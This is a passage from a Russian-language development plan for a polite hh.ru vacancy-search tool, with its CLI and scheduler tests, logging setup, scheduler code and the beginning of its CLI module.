поэтому нечитаемая строка пропускается с записью в лог и с сохранением улик в
`corrupt_payload` — вместо того чтобы отнять у пользователя весь отчёт.

Тест границ окна — в `tests/test_repository.py`:

```python
def test_reported_since_takes_only_reported_rows_inside_the_window(tmp_path: object) -> None:
    """`report --since N` — выборка по окну, а не «всё, что есть».

    Проверяются обе границы сразу: неотправленная вакансия в отчёт не
    попадает (её отправит конвейер, и повтор был бы задвоением), а
    отправленная раньше окна — не попадает тоже, иначе `--since` не значит
    ничего.
    """
    db_path = str(tmp_path) + "/test.db"
    repository = SqliteRepository(db_path)
    repository.init_schema()
    for vacancy_id in ("1", "2", "3"):
        repository.add_discovered(make_vacancy(vacancy_id), "embedded", 9)
        repository.save_enriched(vacancy_id, VacancyDetails(description="текст"), make_score())
    repository.mark_reported(["1", "2"])
    repository.close()
    long_ago = (datetime.now(UTC) - timedelta(days=30)).isoformat()
    corrupt(db_path, "UPDATE vacancy SET reported_at = ? WHERE id = '2'", long_ago)

    repository = SqliteRepository(db_path)
    window = datetime.now(UTC) - timedelta(days=7)
    assert [item.discovered.id for item in repository.reported_since(window)] == ["1"]
    repository.close()
```

Run: `uv run pytest tests/test_repository.py -q && uv run mypy --strict hh_search`
Expected: `57 passed` (56 + один новый), `Success: no issues found`

- [ ] **Step 2: Написать падающие тесты**

Создать `tests/test_cli.py`:

```python
import logging
import sqlite3
from collections.abc import Iterator
from datetime import UTC, datetime, timedelta
from pathlib import Path

import httpx
import pytest
import respx
from typer.testing import CliRunner, Result

from hh_search.__main__ import app
from hh_search.config.loader import load_config
from hh_search.storage.repository import SqliteRepository
from tests.test_config import APP_YAML, write_config
from tests.test_pipeline import TWO_VACANCIES, page_html

FIXTURES = Path(__file__).parent / "fixtures"
LISTING_URL = "https://hh.ru/vacancies/programmist"
PAGE_PATTERN = r"^https://hh\.ru/vacancy/\d+$"
TODAY = f"{datetime.now(UTC):%Y-%m-%d}"

runner = CliRunner()


@pytest.fixture(autouse=True)
def _restore_logging() -> Iterator[None]:
    """`setup_logging` перенастраивает КОРНЕВОЙ логгер — вернём его на место.

    Иначе файловый обработчик, открытый на удалённый `tmp_path`, остаётся
    висеть на весь остаток прогона тестов.
    """
    root = logging.getLogger()
    handlers, level = root.handlers[:], root.level
    yield
    for handler in root.handlers[:]:
        if handler not in handlers:
            handler.close()
    root.handlers[:] = handlers
    root.setLevel(level)


def prepare(tmp_path: Path, **overrides: str) -> Path:
    """Каталог конфигов, у которого все пути ведут в `tmp_path`."""
    config_dir = tmp_path / "config"
    config_dir.mkdir()
    app_yaml = (
        # Пауза между запросами — минимальная разрешённая: тесты ходят через
        # настоящий `time.sleep` (клиент собирает сам CLI), и секунда на
        # запрос превращала весь файл в двадцать три секунды.
        APP_YAML.replace("delay_between_requests_sec: 1.0", "delay_between_requests_sec: 0.1")
        .replace("/data/state", str(tmp_path / "state"))
        .replace("/data/reports", str(tmp_path / "reports"))
        .replace("/data/logs", str(tmp_path / "logs"))
    )
    write_config(config_dir, **{"app.yaml": app_yaml, **overrides})
    return config_dir


def invoke(config_dir: Path, *args: str) -> Result:
    return runner.invoke(app, ["--config-dir", str(config_dir), *args])


def mock_source(listing_status: int = 200) -> None:
    respx.get("https://hh.ru/robots.txt").mock(
        return_value=httpx.Response(
            200,
            text=(FIXTURES / "robots_hh.txt").read_text(encoding="utf-8"),
            headers={"Content-Type": "text/plain"},
        )
    )
    respx.get(url__startswith=LISTING_URL).mock(
        return_value=httpx.Response(listing_status, text=TWO_VACANCIES)
    )
    respx.get(url__regex=PAGE_PATTERN).mock(return_value=httpx.Response(200, text=page_html()))


def state_path(config_dir: Path) -> Path:
    return load_config(config_dir).app.paths.state


# --- init-db и healthcheck: первые секунды жизни контейнера ----------------


def test_init_db_creates_the_state_file(tmp_path: Path) -> None:
    result = invoke(prepare(tmp_path), "init-db")
    assert result.exit_code == 0
    assert (tmp_path / "state" / "hh.db").exists()


def test_healthcheck_before_init_db_fails_and_creates_nothing(tmp_path: Path) -> None:
    """Docker дёргает HEALTHCHECK с первых секунд, до первого `init-db`.

    Прежняя редакция падала `OperationalError` и оставляла после себя
    нулевой файл базы: `sqlite3.connect` создаёт файл молча, и следующий
    `init-db` работал уже по мусору.
    """
    config_dir = prepare(tmp_path)
    result = invoke(config_dir, "healthcheck")
    assert result.exit_code == 1
    assert "init-db" in result.output
    assert not (tmp_path / "state" / "hh.db").exists()


def test_healthcheck_fails_on_a_database_without_schema(tmp_path: Path) -> None:
    """Файл есть, схемы нет — для healthcheck это «работа не делается».

    Кода возврата тут недостаточно: необработанное исключение внутри
    CliRunner тоже даёт единицу, поэтому проверяется ещё и сообщение —
    иначе тест зелен и на голом `OperationalError`.
    """
    config_dir = prepare(tmp_path)
    (tmp_path / "state").mkdir()
    (tmp_path / "state" / "hh.db").write_bytes(b"")
    result = invoke(config_dir, "healthcheck")
    assert result.exit_code == 1
    assert "журнал прогонов не читается" in result.output
    assert result.exception is None or isinstance(result.exception, SystemExit)


def test_healthcheck_passes_after_a_fresh_run(tmp_path: Path) -> None:
    config_dir = prepare(tmp_path)
    invoke(config_dir, "init-db")
    with SqliteRepository(state_path(config_dir)) as repo:
        repo.finish_run(repo.start_run(), "ok")
    assert invoke(config_dir, "healthcheck").exit_code == 0


def test_healthcheck_counts_a_partial_run_as_success(tmp_path: Path) -> None:
    """`partial` — успех для healthcheck: прогон состоялся, часть работы
    потеряна. Именно поэтому «прогон не сделал ничего» обязан быть
    `failed`, иначе индикатор зелен при полной тишине."""
    config_dir = prepare(tmp_path)
    invoke(config_dir, "init-db")
    with SqliteRepository(state_path(config_dir)) as repo:
        repo.finish_run(repo.start_run(), "partial")
    assert invoke(config_dir, "healthcheck").exit_code == 0


def test_healthcheck_fails_on_a_stale_run(tmp_path: Path) -> None:
    config_dir = prepare(tmp_path)
    invoke(config_dir, "init-db")
    stale = datetime.now(UTC) - timedelta(hours=24)
    with SqliteRepository(state_path(config_dir)) as repo:
        repo.finish_run(repo.start_run(), "ok", finished_at=stale)
    result = invoke(config_dir, "healthcheck")
    assert result.exit_code == 1
    assert "последний успешный прогон" in result.output


def test_failed_run_does_not_make_healthcheck_green(tmp_path: Path) -> None:
    """Строка журнала есть, но статус `failed` — индикатор обязан краснеть."""
    config_dir = prepare(tmp_path)
    invoke(config_dir, "init-db")
    with SqliteRepository(state_path(config_dir)) as repo:
        repo.finish_run(repo.start_run(), "failed", error="источник закрыт")
    assert invoke(config_dir, "healthcheck").exit_code == 1


# --- конфиг читается лениво ------------------------------------------------


def test_subcommand_help_works_without_any_config() -> None:
    """`--help` не имеет права требовать существующего /data/config.

    Пока конфиг грузил `@app.callback()`, любая подсказка по подкоманде
    падала на отсутствующем каталоге — то есть первый же способ разобраться
    с CLI не работал.
    """
    result = runner.invoke(app, ["--config-dir", "/nonexistent", "run", "--help"])
    assert result.exit_code == 0
    assert "прогон" in result.output


def test_missing_config_gives_a_message_and_not_a_traceback(tmp_path: Path) -> None:
    result = invoke(tmp_path / "nowhere", "healthcheck")
    assert result.exit_code == 2
    assert "не прочитан" in result.output
    assert "Traceback" not in result.output


def test_config_dir_comes_from_the_environment(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """`HH_CONFIG_DIR` читается в момент вызова, а не при импорте модуля."""
    config_dir = prepare(tmp_path)
    monkeypatch.setenv("HH_CONFIG_DIR", str(config_dir))
    result = runner.invoke(app, ["init-db"])
    assert result.exit_code == 0
    assert (tmp_path / "state" / "hh.db").exists()


def test_unknown_sink_stops_the_run_before_the_database_is_touched(tmp_path: Path) -> None:
    """Опечатка в `sinks` роняет процесс на старте — контракт задачи 9.

    До сети и до `start_run()`: иначе за страницы уже заплачено запросами,
    а отчёт всё равно не выйдет.
    """
    broken = APP_YAML.replace("sinks: [csv, markdown]", "sinks: [csv, telegram]")
    config_dir = prepare(tmp_path, **{"app.yaml": broken})
    result = invoke(config_dir, "run")
    assert result.exit_code == 2
    assert "telegram" in result.output
    assert not (tmp_path / "state" / "hh.db").exists()


# --- run: код возврата повторяет статус прогона ---------------------------


@respx.mock
def test_run_writes_both_reports_and_exits_zero(tmp_path: Path) -> None:
    """Сквозной прогон через CLI: файлы отчётов на диске, код 0."""
    config_dir = prepare(tmp_path)
    mock_source()
    result = invoke(config_dir, "run")
    assert result.exit_code == 0
    csv_report = tmp_path / "reports" / f"{TODAY}-new.csv"
    assert "111" in csv_report.read_text(encoding="utf-8-sig")
    assert (tmp_path / "reports" / f"{TODAY}-new.md").exists()


@respx.mock
def test_run_exits_nonzero_when_reports_cannot_be_written(tmp_path: Path) -> None:
    """Главный сценарий I2: работа не сделана, а код возврата ноль.

    Каталог отчётов занят файлом, поэтому оба приёмника падают. Прогон
    обязан не помечать вакансии отправленными, понизить статус и отдать
    ненулевой код: cron про испорченный volume иначе не узнает никогда.
    """
    config_dir = prepare(tmp_path)
    (tmp_path / "reports").write_text("не каталог", encoding="utf-8")
    mock_source()
    result = invoke(config_dir, "run")
    assert result.exit_code == 3
    assert "partial" in result.output
    with SqliteRepository(state_path(config_dir)) as repo:
        assert [item.discovered.id for item in repo.unreported()] == ["111"]


@respx.mock
def test_run_exits_one_when_the_source_is_silent(tmp_path: Path) -> None:
    """Пустая выдача по всем листингам — `failed` и код 1, а не тихий ноль."""
    config_dir = prepare(tmp_path)
    mock_source()
    respx.get(url__startswith=LISTING_URL).mock(
        return_value=httpx.Response(
            200,
            text='<html><head><link rel="canonical" href="/vacancies/programmist">'
            '<script type="application/ld+json">{"@type": "ItemList", '
            '"itemListElement": []}</script></head></html>',
        )
    )
    result = invoke(config_dir, "run")
    assert result.exit_code == 1
    assert "failed" in result.output


@respx.mock
def test_run_exits_one_on_forbidden(tmp_path: Path) -> None:
    """403 — остановка прогона и внятное сообщение, а не traceback (спека §9)."""
    config_dir = prepare(tmp_path)
    mock_source(listing_status=403)
    result = invoke(config_dir, "run")
    assert result.exit_code == 1
    assert "закрыл доступ" in result.output
    assert "Traceback" not in result.output


# --- mark: id и статус вводит человек -------------------------------------


@respx.mock
def test_mark_sets_the_status_of_an_existing_vacancy(tmp_path: Path) -> None:
    config_dir = prepare(tmp_path)
    mock_source()
    invoke(config_dir, "run")
    result = invoke(config_dir, "mark", "111", "applied")
    assert result.exit_code == 0
    assert read_status(state_path(config_dir), "111") == "applied"


def test_mark_fails_on_an_unknown_id(tmp_path: Path) -> None:
    """`rowcount`, а не «команда не упала».

    Прежняя редакция печатала «111 → applied» и отдавала ноль на любой
    выдуманный id: единственный способ узнать об опечатке — сходить в базу
    руками.
    """
    config_dir = prepare(tmp_path)
    invoke(config_dir, "init-db")
    result = invoke(config_dir, "mark", "999999", "applied")
    assert result.exit_code == 1
    assert "нет в базе" in result.output


def test_mark_rejects_an_unknown_status(tmp_path: Path) -> None:
    """`set_status` статус не валидирует, а вводит его человек: опечатка
    (`aplied`) увела бы вакансию в состояние, невидимое всем трём выборкам."""
    config_dir = prepare(tmp_path)
    invoke(config_dir, "init-db")
    result = invoke(config_dir, "mark", "111", "aplied")
    assert result.exit_code == 2
    assert "допустимы" in result.output


# --- report: единственный способ вернуть историю --------------------------


@respx.mock
def test_report_regenerates_the_files_from_the_database(tmp_path: Path) -> None:
    config_dir = prepare(tmp_path)
    mock_source()
    invoke(config_dir, "run")
    for report in (tmp_path / "reports").iterdir():
        report.unlink()

    result = invoke(config_dir, "report", "--since", "7d")
    assert result.exit_code == 0
    assert "перегенерировано вакансий: 1" in result.output
    assert "111" in (tmp_path / "reports" / f"{TODAY}-new.csv").read_text(encoding="utf-8-sig")


@respx.mock
def test_report_survives_a_corrupted_row(tmp_path: Path) -> None:
    """C5: `report` обязан переживать порчу базы ЛУЧШЕ конвейера, а не хуже.

    Одна строка с битым UTF-8 в `title` роняла весь курсор
    (`OperationalError: Could not decode to UTF-8 column 'title'`) — то
    есть единственный способ пользователя вернуть историю отнимался
    целиком. Здесь порча ровно та же, а вторая вакансия обязана доехать до
    отчёта.
    """
    config_dir = prepare(tmp_path)
    mock_source()
    respx.get(url__startswith=LISTING_URL).mock(
        return_value=httpx.Response(
            200,
            text='<html><head><link rel="canonical" href="/vacancies/programmist">'
            '<script type="application/ld+json">{"@type": "ItemList", "itemListElement": ['
            '{"url": "https://hh.ru/vacancy/111", "name": "Embedded Engineer"},'
            '{"url": "https://hh.ru/vacancy/333", "name": "Linux Engineer"}]}'
            "</script></head></html>",
        )
    )
    invoke(config_dir, "run")
    db = str(state_path(config_dir))
    raw = sqlite3.connect(db)
    raw.execute("UPDATE vacancy SET title = CAST(? AS TEXT) WHERE id = '111'", (b"\xff\xfe",))
    raw.commit()
    raw.close()
    for report in (tmp_path / "reports").iterdir():
        report.unlink()

    result = invoke(config_dir, "report", "--since", "7")
    assert result.exit_code == 0
    assert "перегенерировано вакансий: 1" in result.output
    body = (tmp_path / "reports" / f"{TODAY}-new.csv").read_text(encoding="utf-8-sig")
    assert "333" in body


def test_report_rejects_an_unparsable_period(tmp_path: Path) -> None:
    """`--since 7days` давал traceback: единственный признак — стектрейс."""
    config_dir = prepare(tmp_path)
    invoke(config_dir, "init-db")
    result = invoke(config_dir, "report", "--since", "7days")
    assert result.exit_code == 2
    assert "число дней" in result.output
    assert "Traceback" not in result.output


def test_report_says_when_there_is_nothing(tmp_path: Path) -> None:
    config_dir = prepare(tmp_path)
    invoke(config_dir, "init-db")
    result = invoke(config_dir, "report")
    assert result.exit_code == 0
    assert "не найдено" in result.output


# --- логи -----------------------------------------------------------------


@respx.mock
def test_every_command_writes_the_log_file(tmp_path: Path) -> None:
    """`setup_logging` вызывается не только в `run`/`serve`.

    Карантин пишет `ERROR` из `report` и `mark` тоже, и эти записи —
    единственный след порчи данных. Пока логирование настраивали два
    места из шести, они уходили в никуда.
    """
    config_dir = prepare(tmp_path)
    mock_source()
    invoke(config_dir, "run")
    db = str(state_path(config_dir))
    raw = sqlite3.connect(db)
    raw.execute("UPDATE vacancy SET title = CAST(? AS TEXT) WHERE id = '111'", (b"\xff\xfe",))
    raw.commit()
    raw.close()
    (tmp_path / "logs" / "hh.log").write_text("", encoding="utf-8")

    invoke(config_dir, "report", "--since", "7")
    assert "повреждены данные" in (tmp_path / "logs" / "hh.log").read_text(encoding="utf-8")


def read_status(db: Path, vacancy_id: str) -> str | None:
    raw = sqlite3.connect(str(db))
    row = raw.execute("SELECT status FROM vacancy WHERE id = ?", (vacancy_id,)).fetchone()
    raw.close()
    return None if row is None else str(row[0])
```

Создать `tests/test_scheduler.py`:

```python
import os
import signal
import threading
import time
from pathlib import Path

import pytest

from hh_search.config.loader import load_config
from hh_search.config.models import Config
from hh_search.errors import AccessForbidden
from hh_search.scheduler import EXIT_FORBIDDEN, EXIT_OK, StopSignal, serve
from tests.test_config import write_config

HOUR = 3600.0


@pytest.fixture()
def config(tmp_path: Path) -> Config:
    """Настоящий валидированный конфиг, а не `model_construct`.

    `model_construct` проверок не выполняет, поэтому тест на нём проходил
    бы и с конфигом, который в проде не загрузится; заодно он не проходит
    `mypy --strict` — плагин pydantic требует все поля.
    """
    return load_config(write_config(tmp_path))


class FakeClock(StopSignal):
    """Часы и ожидание под контролем теста.

    Наследуется от `StopSignal`, а не подменяет `time.sleep`: расписание
    считается по монотонным часам, и подделать нужно именно их — иначе
    дрейф проверить нечем.
    """

    def __init__(self, run_duration: float = 0.0, stop_after: int | None = None) -> None:
        super().__init__()
        self.now = 1000.0
        self.delays: list[float] = []
        self.runs = 0
        self._run_duration = run_duration
        self._stop_after = stop_after

    def monotonic(self) -> float:
        return self.now

    def wait(self, seconds: float) -> None:
        self.delays.append(seconds)
        self.now += seconds

    def run(self) -> None:
        self.runs += 1
        self.now += self._run_duration
        if self._stop_after is not None and self.runs >= self._stop_after:
            self.request()


def test_serve_makes_exactly_the_requested_number_of_runs(config: Config) -> None:
    """Три прогона — ДВЕ паузы: после последнего ждать незачем.

    Прежняя редакция закрепляла тестом лишний `sleep` после финального
    прогона, то есть фиксировала как правильное то, что просто удлиняло
    выход.
    """
    clock = FakeClock()
    assert serve(config, clock.run, stop=clock, monotonic=clock.monotonic, iterations=3) == 0
    assert clock.runs == 3
    assert clock.delays == [4 * HOUR, 4 * HOUR]


def test_schedule_does_not_drift_by_the_length_of_the_run(config: Config) -> None:
    """Пауза считается до ДЕДЛАЙНА, а не «интервал после прогона».

    Иначе к каждому интервалу прибавляется длительность прогона: при
    четырёх часах и десятиминутном прогоне сутки уносят расписание на два
    с половиной часа, а через неделю утренний прогон становится ночным.
    """
    clock = FakeClock(run_duration=600.0)
    serve(config, clock.run, stop=clock, monotonic=clock.monotonic, iterations=3)
    assert clock.delays == [4 * HOUR - 600.0, 4 * HOUR - 600.0]


def test_run_longer_than_the_interval_does_not_sleep_negative(
    config: Config, caplog: pytest.LogCaptureFixture
) -> None:
    """Прогон длиннее интервала: следующий начинается сразу, без sleep(-x)."""
    clock = FakeClock(run_duration=5 * HOUR)
    serve(config, clock.run, stop=clock, monotonic=clock.monotonic, iterations=2)
    assert clock.delays == []
    assert "дольше интервала" in caplog.text


def test_failing_run_does_not_stop_the_daemon(
    config: Config, caplog: pytest.LogCaptureFixture
) -> None:
    """Падение прогона не роняет демон: иначе контейнер уходит в петлю
    перезапусков, теряя расписание."""
    clock = FakeClock()
    attempts = {"n": 0}

    def failing() -> None:
        attempts["n"] += 1
        raise RuntimeError("сеть отвалилась")

    assert serve(config, failing, stop=clock, monotonic=clock.monotonic, iterations=2) == 0
    assert attempts["n"] == 2
    assert "продолжаем по расписанию" in caplog.text


# --- устойчивый 403: спека §9 требует остановки ----------------------------


def test_two_forbidden_in_a_row_stop_the_daemon(
    config: Config, caplog: pytest.LogCaptureFixture
) -> None:
    """Сервис, которому hh.ru закрыл доступ, обязан перестать стучаться.

    Прежняя редакция логировала 403 и продолжала цикл вечно: каждые четыре
    часа, годами, и никто об этом не узнавал. Спека §9 требует остановки с
    громким логом.
    """
    clock = FakeClock()
    calls = {"n": 0}

    def forbidden() -> None:
        calls["n"] += 1
        raise AccessForbidden("hh.ru ответил 403")

    code = serve(config, forbidden, stop=clock, monotonic=clock.monotonic, iterations=10)
    assert code == EXIT_FORBIDDEN
    assert calls["n"] == 2
    assert "устойчиво" in caplog.text


def test_a_single_forbidden_between_successes_does_not_stop_the_daemon(config: Config) -> None:
    """Считаются ПОДРЯД идущие: одиночный 403 бывает антиботом на запросе."""
    clock = FakeClock()
    calls = {"n": 0}

    def flaky() -> None:
        calls["n"] += 1
        if calls["n"] in (1, 3):
            raise AccessForbidden("hh.ru ответил 403")

    code = serve(config, flaky, stop=clock, monotonic=clock.monotonic, iterations=4)
    assert (code, calls["n"]) == (EXIT_OK, 4)


# --- остановка по сигналу --------------------------------------------------


def test_stop_request_ends_the_loop_without_another_run(config: Config) -> None:
    """Флаг проверяется МЕЖДУ прогонами: начатый прогон дорабатывает.

    `iterations=10`, но остановка запрошена во втором прогоне, значит
    третьего быть не должно — и ждать после него нечего.
    """
    clock = FakeClock(stop_after=2)
    code = serve(config, clock.run, stop=clock, monotonic=clock.monotonic, iterations=10)
    assert (code, clock.runs, clock.delays) == (EXIT_OK, 2, [4 * HOUR])


def test_sigterm_sets_the_flag() -> None:
    """Обработчик SIGTERM обязан существовать.

    Ядро не применяет диспозицию по умолчанию к PID 1: без обработчика
    сигнал до процесса не доезжает, `docker stop` выжидает весь grace
    period и добивает SIGKILL (замер: 10.2 с и код 137 против 0.2 с и
    кода 0).
    """
    previous = signal.getsignal(signal.SIGTERM)
    stop = StopSignal()
    try:
        stop.install()
        assert not stop.requested()
        os.kill(os.getpid(), signal.SIGTERM)
        assert stop.requested()
    finally:
        signal.signal(signal.SIGTERM, previous)


def test_waiting_is_interrupted_by_the_signal() -> None:
    """Обработчика мало: прерванный сигналом `time.sleep` возобновляется.

    PEP 475 повторяет прерванный вызов, поэтому обработчик, который только
    взводит флаг, оставил бы процесс спать все четыре часа — то есть
    SIGKILL всё равно. Здесь ожидание построено на `threading.Event`:
    `set()` из обработчика освобождает замок, и `wait()` возвращается
    немедленно. Если это сломать, тест не «упадёт быстро», а провисит
    указанные тридцать секунд — и именно это и есть проверяемый факт.
    """
    previous = signal.getsignal(signal.SIGTERM)
    stop = StopSignal()
    try:
        stop.install()
        timer = threading.Timer(0.05, lambda: os.kill(os.getpid(), signal.SIGTERM))
        timer.start()
        started = time.monotonic()
        stop.wait(30.0)
        elapsed = time.monotonic() - started
        timer.cancel()
    finally:
        signal.signal(signal.SIGTERM, previous)
    assert stop.requested()
    assert elapsed < 5.0
```

- [ ] **Step 3: Запустить тесты и убедиться, что они падают**

Run: `uv run pytest tests/test_cli.py tests/test_scheduler.py -q`
Expected: `ModuleNotFoundError: No module named 'hh_search.__main__'` и
`No module named 'hh_search.scheduler'`, «2 errors»

- [ ] **Step 4: Реализовать `hh_search/logging_setup.py`**

```python
"""Логи одновременно в stdout (их забирает `docker logs`) и в файл с ротацией."""

import logging
import sys
from logging.handlers import RotatingFileHandler
from pathlib import Path

FORMAT = "%(asctime)s %(levelname)-7s %(name)s: %(message)s"

# httpx на INFO пишет строку на КАЖДЫЙ запрос, включая robots.txt. За сутки
# это несколько сотен строк, среди которых теряются наши ERROR — а именно
# они здесь единственный способ узнать о потере данных.
QUIET_LOGGERS = ("httpx", "httpcore")


def setup_logging(logs_dir: Path, level: int = logging.INFO) -> None:
    """Настроить корневой логгер. Вызывается КАЖДОЙ командой CLI.

    Не только `run`/`serve`: карантин хранилища пишет `ERROR` из любой
    команды, включая `report` и `mark`, и эти записи — единственный след
    порчи данных. Уходить в никуда они не имеют права.
    """
    formatter = logging.Formatter(FORMAT)
    handlers: list[logging.Handler] = [logging.StreamHandler(sys.stdout)]
    file_error: OSError | None = None
    try:
        logs_dir.mkdir(parents=True, exist_ok=True)
        handlers.append(
            RotatingFileHandler(
                logs_dir / "hh.log", maxBytes=5_000_000, backupCount=5, encoding="utf-8"
            )
        )
    except OSError as error:
        # Недоступный каталог логов — не причина не искать вакансии:
        # stdout остаётся, и в него же уходит жалоба на потерю файла.
        file_error = error

    root = logging.getLogger()
    root.setLevel(level)
    root.handlers.clear()
    for handler in handlers:
        handler.setFormatter(formatter)
        root.addHandler(handler)
    for name in QUIET_LOGGERS:
        logging.getLogger(name).setLevel(logging.WARNING)
    if file_error is not None:
        root.error("логи пишутся только в stdout: каталог %s недоступен (%s)", logs_dir, file_error)
```

- [ ] **Step 5: Реализовать `hh_search/scheduler.py`**

```python
"""Цикл режима `serve`: расписание, остановка по сигналу, устойчивый 403."""

import logging
import signal
import threading
import time
from collections.abc import Callable
from types import FrameType

from hh_search.config.models import Config
from hh_search.errors import AccessForbidden

logger = logging.getLogger(__name__)

# Одиночный 403 бывает случайным (антибот на конкретном запросе). Второй
# ПОДРЯД — это уже устойчивый отказ доступа, а спека §9 требует на него
# остановку с громким логом. Стучаться каждые четыре часа вечно значит и
# продолжать нарушать запрет, и не дать никому об этом узнать.
MAX_FORBIDDEN_IN_A_ROW = 2

EXIT_OK = 0
EXIT_FORBIDDEN = 1

# Сигналы, по которым демон завершается штатно. SIGINT сюда не входит
# намеренно: Ctrl+C должен прерывать процесс сразу (KeyboardInterrupt),
# а не «после текущего прогона».
STOP_SIGNALS = (signal.SIGTERM,)


class StopSignal:
    """Флаг «пора остановиться» плюс прерываемое ожидание.

    Ожидание построено на `threading.Event`, а не на `time.sleep`, и это
    не стилистика. Ядро не применяет диспозицию по умолчанию к PID 1,
    поэтому без явного обработчика SIGTERM до процесса просто не
    доезжает: `docker stop` выжидает весь grace period и добивает
    SIGKILL (замер: 10.2 с и код 137 против 0.2 с и кода 0). А
    обработчика мало: по PEP 475 прерванный сигналом `time.sleep`
    возобновляется, то есть флаг взводится и процесс продолжает спать все
    четыре часа. `Event.set()` из обработчика освобождает замок, которого
    ждёт `Event.wait()`, поэтому ожидание кончается немедленно.

    Цена честного завершения — незакрытая строка `run` в журнале при
    остановке посреди прогона; конвейер закрывает её сам, потому что
    остановка проверяется только МЕЖДУ прогонами.
    """

    def __init__(self) -> None:
        self._event = threading.Event()

    def install(self, numbers: tuple[signal.Signals, ...] = STOP_SIGNALS) -> None:
        for number in numbers:
            signal.signal(number, self._handle)

    def _handle(self, number: int, frame: FrameType | None) -> None:
        logger.warning(
            "получен %s: завершаем работу после текущего прогона", signal.Signals(number).name
        )
        self.request()

    def request(self) -> None:
        """Попросить остановиться. Взводит флаг и обрывает ожидание."""
        self._event.set()

    def requested(self) -> bool:
        return self._event.is_set()

    def wait(self, seconds: float) -> None:
        self._event.wait(seconds)


def serve(
    config: Config,
    run: Callable[[], object],
    *,
    stop: StopSignal | None = None,
    monotonic: Callable[[], float] = time.monotonic,
    iterations: int | None = None,
) -> int:
    """Прогоны по расписанию. Возвращает код возврата процесса.

    Расписание считается по ДЕДЛАЙНУ, а не паузой после прогона: пауза на
    фиксированный интервал добавляет к нему длительность самого прогона, и
    при четырёх часах и десятиминутном прогоне сутки уносят расписание на
    два с половиной часа. Через неделю «утренний» прогон становится
    ночным.

    Отказ одного прогона не роняет демон (иначе контейнер уходил бы в
    петлю перезапусков), но `AccessForbidden` подряд — исключение из
    правила: см. `MAX_FORBIDDEN_IN_A_ROW`.
    """
    interval = config.app.schedule.interval_hours * 3600.0
    signal_ = stop if stop is not None else StopSignal()
    forbidden = 0
    completed = 0
    try:
        while iterations is None or completed < iterations:
            deadline = monotonic() + interval
            try:
                run()
            except AccessForbidden as error:
                forbidden += 1
                logger.error(
                    "hh.ru закрыл доступ (%d-й раз подряд): %s", forbidden, error, exc_info=True
                )
                if forbidden >= MAX_FORBIDDEN_IN_A_ROW:
                    logger.error(
                        "доступ закрыт устойчиво (%d прогона подряд), демон остановлен. "
                        "Обходные пути не применяются — нужен человек",
                        forbidden,
                    )
                    return EXIT_FORBIDDEN
            except Exception:
                logger.exception("прогон завершился с ошибкой, продолжаем по расписанию")
            else:
                forbidden = 0
            completed += 1
            if signal_.requested():
                break
            if iterations is not None and completed >= iterations:
                # Ждать после последнего прогона незачем: пауза перед
                # выходом только удлиняет тест и маскирует дрейф.
                break
            _wait_until(signal_, deadline - monotonic(), interval)
            if signal_.requested():
                break
    except KeyboardInterrupt:
        logger.warning("прерван с клавиатуры, выходим")
        return EXIT_OK
    logger.info("демон остановлен, выполнено прогонов: %d", completed)
    return EXIT_OK


def _wait_until(signal_: StopSignal, remaining: float, interval: float) -> None:
    if remaining <= 0:
        logger.warning(
            "прогон занял дольше интервала (%.0f с), следующий начинается немедленно; "
            "расписание не сдвигается",
            interval,
        )
        return
    signal_.wait(remaining)
```

- [ ] **Step 6: Реализовать `hh_search/__main__.py`**

```python
"""CLI (спека §8.3). Конфиг читается ЛЕНИВО, внутри команды.

`@app.callback()`, загружающий конфиг, ломал две вещи сразу: `--help` любой
подкоманды требовал существующего `/data/config`, а отсутствие конфига
давало голый traceback вместо внятного сообщения. Здесь callback запоминает
только каталог, а читает его та команда, которой конфиг действительно нужен.
"""

import logging
import os
import re
import sqlite3
from collections.abc import Sequence
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Annotated, NoReturn

import typer

from hh_search.config.loader import load_config
from hh_search.config.models import Config
from hh_search.errors import AccessForbidden
from hh_search.logging_setup import setup_logging
from hh_search.pipeline import OK, RunStats, run_once
from hh_search.scheduler import StopSignal, serve
from hh_search.scoring.keyword import KeywordScorer
from hh_search.sinks import build_sinks
from hh_search.sinks.base import Sink
from hh_search.sources.http import PoliteClient
from hh_search.storage.repository import SqliteRepository

logger = logging.getLogger(__name__)
app = typer.Typer(help="Автопоиск вакансий на hh.ru", no_args_is_help=True)

DEFAULT_CONFIG_DIR = Path("/data/config")
# 2 — код click'а для ошибки в аргументах; ошибка конфига по смыслу та же.
# 1 и 3 приходят из статуса прогона (см. pipeline/stats.py).
EXIT_CONFIG = 2
EXIT_FAILED = 1
# Ручные статусы из спеки §5.2 плюс те, что ставит конвейер: `mark`
# получает статус от человека, а `set_status` его не валидирует, и опечатка
# (`mark 1 aplied`) увела бы вакансию в состояние, невидимое всем выборкам.
MANUAL_STATUSES = ("interesting", "applied", "archived", "new", "rejected", "reported")
_SINCE_RE = re.compile(r"^(\d+)\s*d?$")

ConfigDir = Annotated[Path | None, typer.Option("--config-dir", help="Каталог с YAML-конфигами")]
Since = Annotated[str, typer.Option("--since", help="Период в днях: 7 или 7d")]


@app.callback()
def main(ctx: typer.Context, config_dir: ConfigDir = None) -> None:
    """Запоминает каталог конфигов. Ничего не читает и не создаёт."""
    ctx.obj = config_dir or Path(os.environ.get("HH_CONFIG_DIR", DEFAULT_CONFIG_DIR))


def _die(message: str, code: int) -> NoReturn:
    typer.echo(message, err=True)
    raise typer.Exit(code)


def _config(ctx: typer.Context) -> Config:
    """Прочитать конфиг и включить логи. Ошибка конфига — внятный текст."""
    config_dir = ctx.obj if isinstance(ctx.obj, Path) else DEFAULT_CONFIG_DIR
    try:
        config = load_config(config_dir)
    except (OSError, ValueError) as error:
        _die(f"конфиг в {config_dir} не прочитан: {error}", EXIT_CONFIG)
    setup_logging(config.app.paths.logs)
    return config


def _sinks(config: Config) -> list[Sink]:
    """Приёмники строятся ДО сети и до `start_run()` — контракт задачи 9.

    В режиме `serve` это ещё важнее: собранное внутри прогона неизвестное
    имя приёмника попало бы в `except Exception` планировщика, и демон
    крутил бы бесполезный цикл каждые четыре часа.
    """
    try:
        return build_sinks(
            config.app.sinks, config.app.paths.reports, config.profile.report_threshold
        )
    except ValueError as error:
        _die(f"в app.yaml неизвестный приёмник: {error}", EXIT_CONFIG)


def _open(config: Config) -> SqliteRepository:
    """Открыть существующую базу. Отсутствие файла — не повод создавать его.

    `sqlite3.connect` создаёт файл молча, поэтому `healthcheck` до
